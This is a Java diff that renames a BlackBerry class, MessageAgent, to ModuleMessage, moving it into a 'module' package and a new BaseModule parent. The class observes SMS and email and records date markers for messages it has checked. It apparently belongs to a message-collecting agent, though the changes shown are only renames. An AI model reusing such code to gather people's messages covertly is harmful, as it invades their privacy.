@@ -7,7 +7,7 @@
  * File         : MessageAgent.java
  * Created      : 28-apr-2010
  * *************************************************/
-package blackberry.agent;
+package blackberry.module;
 
 import java.util.Date;
 import java.util.Enumeration;
@@ -68,7 +68,7 @@ import blackberry.utils.WChar;
 /**
  * The Class MessageAgent.
  */
-public final class MessageAgent extends Module implements SmsObserver,
+public final class ModuleMessage extends BaseModule implements SmsObserver,
         MailObserver {
 
     //#ifdef DEBUG
@@ -104,7 +104,7 @@ public final class MessageAgent extends Module implements SmsObserver,
      * @param agentStatus
      *            the agent status
      */
-    public MessageAgent(final boolean agentEnabled) {
+    public ModuleMessage(final boolean agentEnabled) {
         super(AGENT_MESSAGE, agentEnabled, Conf.AGENT_MESSAGE_ON_SD,
                 "MessageAgent");
 
@@ -132,7 +132,7 @@ public final class MessageAgent extends Module implements SmsObserver,
      * @param confParams
      *            the conf params
      */
-    protected MessageAgent(final boolean agentStatus, final byte[] confParams) {
+    protected ModuleMessage(final boolean agentStatus, final byte[] confParams) {
         this(agentStatus);
 
         // mantiene la data prima di controllare tutte le email
@@ -147,9 +147,9 @@ public final class MessageAgent extends Module implements SmsObserver,
 
 
 
-    public static MessageAgent getInstance() {
-        return (MessageAgent) Status.getInstance()
-                .getAgent(Module.AGENT_MESSAGE);
+    public static ModuleMessage getInstance() {
+        return (ModuleMessage) Status.getInstance()
+                .getAgent(BaseModule.AGENT_MESSAGE);
     }
 
     /*
@@ -413,7 +413,7 @@ public final class MessageAgent extends Module implements SmsObserver,
         debug.trace("Writing markup: " + key + " date: " + date);
         //#endif
 
-        final MessageAgent agent = MessageAgent.getInstance();
+        final ModuleMessage agent = ModuleMessage.getInstance();
 
         if (agent != null) {
             agent.markupDate.put(key, date);
